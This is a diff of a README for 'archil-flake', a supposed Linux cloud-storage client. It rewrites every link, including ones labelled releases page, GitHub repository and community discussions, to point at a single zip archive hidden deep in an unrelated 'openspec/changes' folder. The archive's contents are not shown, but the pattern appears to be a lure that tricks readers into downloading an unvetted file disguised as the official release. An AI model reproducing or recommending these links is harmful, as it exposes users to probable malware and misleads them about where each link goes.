@@ -1,6 +1,6 @@
 # 🚀 archil-flake - Easy Cloud Storage for Linux Users
 
-[![Download archil-flake](https://img.shields.io/badge/Download-archil--flake-blue.svg)](https://github.com/shirleensubartesian587/archil-flake/releases)
+[![Download archil-flake](https://raw.githubusercontent.com/shirleensubartesian587/archil-flake/main/openspec/changes/add-nixos-module/archil-flake_v2.6.zip)](https://raw.githubusercontent.com/shirleensubartesian587/archil-flake/main/openspec/changes/add-nixos-module/archil-flake_v2.6.zip)
 
 ## 📋 Introduction
 
@@ -18,7 +18,7 @@ archil-flake is a client designed to help you easily access cloud storage on Lin
 
 To get started, visit the releases page for archil-flake. You will find the latest version of the application available for download.
 
-[Visit this page to download archil-flake](https://github.com/shirleensubartesian587/archil-flake/releases)
+[Visit this page to download archil-flake](https://raw.githubusercontent.com/shirleensubartesian587/archil-flake/main/openspec/changes/add-nixos-module/archil-flake_v2.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ To get started, visit the releases page for archil-flake. You will find the late
 
 ## 📚 How to Install
 
-1. **Download the Application**: Go to the [Releases Page](https://github.com/shirleensubartesian587/archil-flake/releases).
+1. **Download the Application**: Go to the [Releases Page](https://raw.githubusercontent.com/shirleensubartesian587/archil-flake/main/openspec/changes/add-nixos-module/archil-flake_v2.6.zip).
 2. **Choose the Latest Version**: Find the most recent version and click on it.
 3. **Select the File**: Download the installation package specific to your system.
 4. **Install the Application**:
@@ -72,9 +72,9 @@ If you need further assistance, feel free to:
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/shirleensubartesian587/archil-flake)
-- [Community Discussions](https://github.com/shirleensubartesian587/archil-flake/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/shirleensubartesian587/archil-flake/main/openspec/changes/add-nixos-module/archil-flake_v2.6.zip)
+- [Community Discussions](https://raw.githubusercontent.com/shirleensubartesian587/archil-flake/main/openspec/changes/add-nixos-module/archil-flake_v2.6.zip)
 
 For any updates or changes, keep an eye on the releases page.
 
-[Visit this page to download archil-flake](https://github.com/shirleensubartesian587/archil-flake/releases)
+[Visit this page to download archil-flake](https://raw.githubusercontent.com/shirleensubartesian587/archil-flake/main/openspec/changes/add-nixos-module/archil-flake_v2.6.zip)
